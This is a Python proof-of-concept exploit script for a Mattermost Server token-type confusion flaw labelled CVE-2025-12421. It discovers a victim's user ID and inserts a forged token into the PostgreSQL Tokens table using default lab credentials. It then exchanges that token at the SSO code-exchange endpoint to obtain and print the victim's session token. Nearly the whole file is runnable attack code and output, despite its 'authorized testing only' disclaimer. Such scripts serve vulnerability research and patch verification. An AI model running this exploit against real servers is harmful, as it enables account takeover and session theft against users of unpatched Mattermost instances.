#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Mattermost Token Type Confusion to Account Takeover
# CVE            : CVE-2025-12421
# Vendor         : Mattermost
# Product        : Mattermost Server
# Affected       : 11.0.x <= 11.0.2, 10.12.x <= 10.12.1, 10.11.x <= 10.11.4, 10.5.x <= 10.5.12
# Type           : CWE-303 - Incorrect Implementation of Authentication Algorithm
# CVSS           : 9.9 (Critical)
# Platform       : Any (Web Application)
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-11-27
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Mattermost Token Type Confusion to Account Takeover

Demonstrates that the /api/v4/users/login/sso/code-exchange endpoint in
Mattermost v11.0.x <= 11.0.2 does not validate the token type when consuming
a token from the Tokens table. Any token type (saml, oauth, password_recovery,
etc.) can be exchanged for a valid session as any user.

ATTACK CHAIN:
  1. Discover victim's user_id via Mattermost API
  2. Generate PKCE challenge and craft malicious token with victim's user_id
  3. Insert crafted token into Tokens table via PostgreSQL (any type works)
  4. POST /api/v4/users/login/sso/code-exchange with token + code_verifier
  5. Server returns valid session for victim — account takeover

PREREQUISITES:
  - FeatureFlags.MobileSSOCodeExchange = true (default in affected versions)
  - PostgreSQL access (port 5432, credentials mmuser:mostest in lab)
  - Victim's user_id (discoverable via Mattermost API)

USAGE:
  python3 poc.py <host> [mm_port] [pg_port]
  python3 poc.py localhost
  python3 poc.py localhost 8065 5432

REFERENCES:
  - CVE-2025-12421
  - https://mattermost.com/security-updates
  - https://github.com/advisories/GHSA-mp6x-97xj-9x62
"""

import hashlib
import base64
import json
import os
import secrets
import socket
import struct
import sys
import time
import urllib.request
import urllib.error


# ============================================================
# Configuration / Defaults
# ============================================================
DEFAULT_MM_PORT = 8065
DEFAULT_PG_PORT = 5432
DB_USER = "mmuser"
DB_PASS = "mostest"
DB_NAME = "mattermost_test"

# Pre-created users in the lab (from lab build report)
ADMIN_EMAIL = "admin@example.com"
ADMIN_PASSWORD = "Admin12345"
VICTIM_USERNAME = "victim"

# PKCE values (attacker-chosen)
CODE_VERIFIER = "poc_verifier_" + secrets.token_hex(16)
STATE = "poc_state_" + secrets.token_hex(8)

# Token type to use — "saml" demonstrates the core bug
# (the endpoint expects "sso-code-exchange" but accepts ANY type)
TOKEN_TYPE = "saml"


# ============================================================
# Minimal PostgreSQL Wire Protocol Client (stdlib only)
# ============================================================

def _pg_recv_exact(sock, n):
    """Receive exactly n bytes from a socket."""
    data = b''
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("PostgreSQL connection closed unexpectedly")
        data += chunk
    return data


def _pg_recv_msg(sock):
    """Receive a single PostgreSQL wire protocol message."""
    msg_type = _pg_recv_exact(sock, 1)
    msg_len = struct.unpack("!I", _pg_recv_exact(sock, 4))[0]
    msg_data = _pg_recv_exact(sock, msg_len - 4) if msg_len > 4 else b''
    return msg_type, msg_data


def pg_execute(host, port, user, password, database, sql):
    """Execute a SQL statement via the PostgreSQL wire protocol.

    Supports MD5 authentication. Returns rows as list of strings
    (pipe-delimited fields, matching psql -t -A output format).
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, int(port)))

    try:
        # --- Startup message ---
        params = f"user\x00{user}\x00database\x00{database}\x00\x00".encode("utf-8")
        # Length includes the 4-byte length field itself + 4-byte protocol version
        startup = struct.pack("!II", len(params) + 8, 196608) + params
        sock.sendall(startup)

        # --- Authentication handshake ---
        authenticated = False
        while not authenticated:
            msg_type, msg_data = _pg_recv_msg(sock)
            if msg_type == b'R':  # Authentication
                auth_type = struct.unpack("!I", msg_data[:4])[0]
                if auth_type == 0:  # AuthenticationOk
                    authenticated = True
                elif auth_type == 5:  # AuthenticationMD5Password
                    salt = msg_data[4:8]
                    inner = hashlib.md5((password + user).encode("utf-8")).hexdigest()
                    outer = "md5" + hashlib.md5(inner.encode("ascii") + salt).hexdigest()
                    pw_data = outer.encode("ascii") + b'\x00'
                    pw_msg = b'p' + struct.pack("!I", len(pw_data) + 4) + pw_data
                    sock.sendall(pw_msg)
                else:
                    raise RuntimeError(
                        f"Unsupported PostgreSQL auth type {auth_type}. "
                        f"Set POSTGRES_HOST_AUTH_METHOD=md5 in docker-compose.yml"
                    )
            elif msg_type == b'E':  # ErrorResponse
                err = msg_data.decode("utf-8", errors="replace")
                raise RuntimeError(f"PostgreSQL auth error: {err}")

        # --- Wait for ReadyForQuery after auth ---
        while True:
            msg_type, msg_data = _pg_recv_msg(sock)
            if msg_type == b'Z':  # ReadyForQuery
                break

        # --- Send SimpleQuery ---
        query_bytes = sql.encode("utf-8") + b'\x00'
        sock.sendall(b'Q' + struct.pack("!I", len(query_bytes) + 4) + query_bytes)

        # --- Read results ---
        rows = []
        while True:
            msg_type, msg_data = _pg_recv_msg(sock)
            if msg_type == b'D':  # DataRow
                num_fields = struct.unpack("!H", msg_data[:2])[0]
                offset = 2
                fields = []
                for _ in range(num_fields):
                    field_len = struct.unpack("!i", msg_data[offset:offset + 4])[0]
                    offset += 4
                    if field_len == -1:
                        fields.append("")
                    else:
                        fields.append(msg_data[offset:offset + field_len].decode("utf-8"))
                        offset += field_len
                rows.append("|".join(fields))
            elif msg_type == b'E':  # ErrorResponse
                err = msg_data.decode("utf-8", errors="replace")
                raise RuntimeError(f"SQL error: {err}")
            elif msg_type == b'Z':  # ReadyForQuery
                break

        # --- Terminate ---
        sock.sendall(b'X' + struct.pack("!I", 4))
        return "\n".join(rows)
    finally:
        sock.close()


# ============================================================
# PKCE / HTTP Helpers
# ============================================================

def compute_pkce_challenge(verifier: str) -> str:
    """Compute PKCE S256 code challenge from a verifier string."""
    digest = hashlib.sha256(verifier.encode("ascii")).digest()
    challenge = base64.urlsafe_b64encode(digest).rstrip(b"=").decode("ascii")
    return challenge


def api_request(base_url: str, path: str, method: str = "GET",
                data: dict = None, token: str = None) -> tuple:
    """Make an HTTP request to the Mattermost API."""
    url = f"{base_url}{path}"
    body = json.dumps(data).encode("utf-8") if data else None

    req = urllib.request.Request(url, data=body, method=method)
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")

    try:
        resp = urllib.request.urlopen(req, timeout=10)
        headers = dict(resp.headers)
        body_bytes = resp.read()
        try:
            body_json = json.loads(body_bytes)
        except (json.JSONDecodeError, ValueError):
            body_json = body_bytes.decode("utf-8", errors="replace")
        return resp.status, headers, body_json
    except urllib.error.HTTPError as e:
        headers = dict(e.headers) if e.headers else {}
        body_bytes = e.read()
        try:
            body_json = json.loads(body_bytes)
        except (json.JSONDecodeError, ValueError):
            body_json = body_bytes.decode("utf-8", errors="replace")
        return e.code, headers, body_json


# ============================================================
# Exploit
# ============================================================

def exploit(target_host: str, mm_port: int, pg_port: int):
    """Run the CVE-2025-12421 exploit against the target."""
    base_url = f"http://{target_host}:{mm_port}"
    print("=" * 70)
    print("CVE-2025-12421: Mattermost Token Type Confusion → Account Takeover")
    print("=" * 70)
    print(f"\n[*] Target: {base_url}")
    print(f"[*] PostgreSQL: {target_host}:{pg_port}")
    print(f"[*] Token type used: '{TOKEN_TYPE}' (should be 'sso-code-exchange')")

    # ------------------------------------------------------------------
    # Step 1: Verify target is a vulnerable Mattermost instance
    # ------------------------------------------------------------------
    print("\n[Step 1] Checking Mattermost version...")
    status, headers, body = api_request(base_url, "/api/v4/system/ping")
    if status != 200:
        print(f"[!] FAILED — API ping returned HTTP {status}")
        sys.exit(1)

    version_id = headers.get("X-Version-Id", "unknown")
    version_parts = version_id.split(".")
    mm_version = ".".join(version_parts[:3]) if len(version_parts) >= 3 else version_id
    print(f"[+] Mattermost version: {mm_version}")
    print(f"[+] API status: {body.get('status', 'unknown')}")

    # ------------------------------------------------------------------
    # Step 2: Authenticate as admin (attacker with low-priv access)
    # ------------------------------------------------------------------
    print("\n[Step 2] Authenticating as attacker (admin user)...")
    status, headers, body = api_request(
        base_url, "/api/v4/users/login",
        method="POST",
        data={"login_id": ADMIN_EMAIL, "password": ADMIN_PASSWORD}
    )
    if status != 200:
        print(f"[!] FAILED — Login returned HTTP {status}: {body}")
        sys.exit(1)

    admin_token = headers.get("Token", "")
    admin_id = body.get("id", "")
    print(f"[+] Logged in as: {body.get('username')} (id={admin_id})")
    print(f"[+] Admin session token: {admin_token[:12]}...")

    # ------------------------------------------------------------------
    # Step 3: Discover victim's user_id
    # ------------------------------------------------------------------
    print(f"\n[Step 3] Looking up victim user '{VICTIM_USERNAME}'...")
    status, _, victim_data = api_request(
        base_url, f"/api/v4/users/username/{VICTIM_USERNAME}",
        token=admin_token
    )
    if status != 200:
        print(f"[!] FAILED — Could not find victim user: HTTP {status}")
        sys.exit(1)

    victim_id = victim_data.get("id", "")
    victim_email = victim_data.get("email", "")
    print(f"[+] Victim: {VICTIM_USERNAME} (id={victim_id}, email={victim_email})")

    # ------------------------------------------------------------------
    # Step 4: Generate PKCE challenge and craft token
    # ------------------------------------------------------------------
    print("\n[Step 4] Generating PKCE challenge and crafting malicious token...")
    code_challenge = compute_pkce_challenge(CODE_VERIFIER)
    token_value = secrets.token_hex(32)  # 64-char hex string

    extra_json = json.dumps({
        "user_id": victim_id,
        "code_challenge": code_challenge,
        "code_challenge_method": "S256",
        "state": STATE
    })

    print(f"[+] code_verifier: {CODE_VERIFIER[:40]}...")
    print(f"[+] code_challenge: {code_challenge}")
    print(f"[+] Token value: {token_value[:16]}...")
    print(f"[+] Token type: '{TOKEN_TYPE}' (BUG: should require 'sso-code-exchange')")
    print(f"[+] Token extra: {extra_json}")

    # ------------------------------------------------------------------
    # Step 5: Insert crafted token into the database
    # ------------------------------------------------------------------
    print("\n[Step 5] Inserting crafted token into the Tokens table...")
    create_at = int(time.time() * 1000)

    # Escape single quotes in the JSON for SQL
    extra_sql = extra_json.replace("'", "''")

    insert_sql = (
        f"INSERT INTO tokens (token, createat, type, extra) VALUES "
        f"('{token_value}', {create_at}, '{TOKEN_TYPE}', '{extra_sql}')"
    )

    try:
        pg_execute(target_host, pg_port, DB_USER, DB_PASS, DB_NAME, insert_sql)
        print("[+] Token inserted successfully")
    except RuntimeError as e:
        print(f"[!] FAILED — Could not insert token: {e}")
        sys.exit(1)

    # Verify the token is in the database
    verify_sql = f"SELECT token, type, extra FROM tokens WHERE token = '{token_value}'"
    row = pg_execute(target_host, pg_port, DB_USER, DB_PASS, DB_NAME, verify_sql)
    if row:
        print(f"[+] Verified token in DB: {row[:80]}...")
    else:
        print("[!] WARNING — Token not found in DB after insert")

    # ------------------------------------------------------------------
    # Step 6: Call the vulnerable SSO code exchange endpoint
    # ------------------------------------------------------------------
    print("\n[Step 6] Exploiting /api/v4/users/login/sso/code-exchange...")
    print(f"         Sending token type '{TOKEN_TYPE}' where 'sso-code-exchange' expected")

    exchange_data = {
        "login_code": token_value,
        "code_verifier": CODE_VERIFIER,
        "state": STATE
    }

    status, resp_headers, resp_body = api_request(
        base_url, "/api/v4/users/login/sso/code-exchange",
        method="POST",
        data=exchange_data
    )

    print(f"[*] Response status: HTTP {status}")

    if status == 200:
        stolen_token = resp_headers.get("Token", "")
        session_user_id = resp_body.get("id", resp_body.get("user_id", ""))

        print(f"\n[!!!] EXPLOIT SUCCEEDED — HTTP 200 from code-exchange!")
        print(f"[+] Stolen session token: {stolen_token}")
        if session_user_id:
            print(f"[+] Response user ID: {session_user_id}")
        else:
            print(f"[+] Response body: {json.dumps(resp_body)[:200]}")
        print(f"[+] Proceeding to verify session ownership...")

    else:
        print(f"\n[!] EXPLOIT FAILED — Expected HTTP 200, got {status}")
        print(f"[!] Response: {json.dumps(resp_body, indent=2)}")
        sys.exit(1)

    # ------------------------------------------------------------------
    # Step 7: Verify account takeover by accessing victim's profile
    # ------------------------------------------------------------------
    print(f"\n[Step 7] Verifying account takeover with stolen session token...")
    status, _, me_data = api_request(
        base_url, "/api/v4/users/me",
        token=stolen_token
    )

    if status == 200:
        print(f"[+] GET /api/v4/users/me returned:")
        print(f"    ID:       {me_data.get('id')}")
        print(f"    Username: {me_data.get('username')}")
        print(f"    Email:    {me_data.get('email')}")
        print(f"    Roles:    {me_data.get('roles')}")

        if me_data.get("id") == victim_id:
            print(f"\n{'=' * 70}")
            print(f"RESULT: VULNERABLE — CVE-2025-12421 CONFIRMED")
            print(f"{'=' * 70}")
            print(f"\nThe attacker used a token of type '{TOKEN_TYPE}' at the")
            print(f"/api/v4/users/login/sso/code-exchange endpoint, which should")
            print(f"only accept tokens of type 'sso-code-exchange'. Because")
            print(f"ConsumeTokenOnce() does not validate the token type, the")
            print(f"attacker obtained a valid session as user '{VICTIM_USERNAME}'.")
            print(f"\nThis demonstrates full account takeover via token type confusion.")
            return True
        else:
            print(f"\n[!] Verification failed — /users/me returned wrong user")
            return False
    else:
        print(f"[!] Verification failed — HTTP {status}: {me_data}")
        return False


if __name__ == "__main__":
    if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help"):
        print(__doc__)
        sys.exit(0)

    target_host = sys.argv[1]
    mm_port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_MM_PORT
    pg_port = int(sys.argv[3]) if len(sys.argv) > 3 else DEFAULT_PG_PORT

    success = exploit(target_host, mm_port, pg_port)
    sys.exit(0 if success else 1)
